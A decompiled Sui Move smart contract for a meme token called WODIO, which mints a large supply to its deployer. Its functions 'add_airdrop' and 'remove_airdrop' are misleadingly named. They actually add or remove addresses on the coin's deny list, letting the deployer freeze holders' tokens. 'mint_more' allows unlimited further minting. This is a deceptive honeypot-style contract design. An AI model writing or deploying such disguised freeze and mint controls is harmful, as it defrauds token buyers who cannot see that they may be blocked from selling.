module 0xe4f82eb1fbf9384a16846d8a12fd437c6386397a9b0d56273b7fd2ce5018edb6::WODIO {
    struct WODIO has drop {
        dummy_field: bool,
    }

    public entry fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WODIO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<WODIO>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: WODIO, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<WODIO>(arg0, 6, b"WODIO", b"Wogtardio", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://pump.mypinata.cloud/ipfs/QmSCi1fveJog1vpUCBnhUxqY4KvkvZfjH4iz9VMFeSUfww?img-width=256&img-dpr=2&img-onerror=redirect")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<WODIO>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<WODIO>>(0x2::coin::mint<WODIO>(&mut v3, 10000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<WODIO>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<WODIO>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun mint_more(arg0: &mut 0x2::coin::TreasuryCap<WODIO>, arg1: u64, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<WODIO>>(0x2::coin::mint<WODIO>(arg0, arg1, arg2), 0x2::tx_context::sender(arg2));
    }

    public entry fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WODIO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<WODIO>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

